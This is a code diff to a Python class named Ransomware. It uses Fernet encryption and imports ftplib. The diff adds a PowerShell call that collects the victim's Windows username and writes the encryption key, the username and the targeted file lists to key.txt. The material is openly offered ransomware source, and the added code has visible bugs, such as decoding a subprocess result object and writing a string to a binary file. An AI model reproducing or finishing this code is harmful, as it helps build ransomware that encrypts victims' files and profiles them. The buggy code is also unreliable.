@@ -1,8 +1,9 @@
 import os
 import random
 import string
-import platform
 import ftplib
+import platform
+import subprocess
 from cryptography.fernet import Fernet
 
 
@@ -14,10 +15,19 @@ class Ransomware:
                  key=Fernet.generate_key()
                  ) -> None:
         
-        with open("key.txt", "wb") as key_file:
-            key_file.write(key)
+        get_name1 = "powershell.exe [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
+        name = subprocess.run(get_name1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).decode("utf-8")
 
-        key_dir = "os.getcwd()" + "/key.txt"
+        keytxt = f"""
+Key:   {key}\n
+Name:  {name}\n
+Files: {files}\n
+Dict:  {files_dict}
+"""
+        with open("key.txt", "wb") as key_file:
+            key_file.write(keytxt)
+
+        key_dir = f"{os.getcwd()}" + "/key.txt"
         self.key_dir = key_dir
 
         system_name = platform.system()
@@ -36,8 +46,6 @@ class Ransomware:
         self.directories = directories
         self.key = key
         self.files_dict = files_dict
-
-        self.message = f"KEY : {key} +\nFiles_list :\n{files}"
 
     def id_generator(self, 
                      size, 
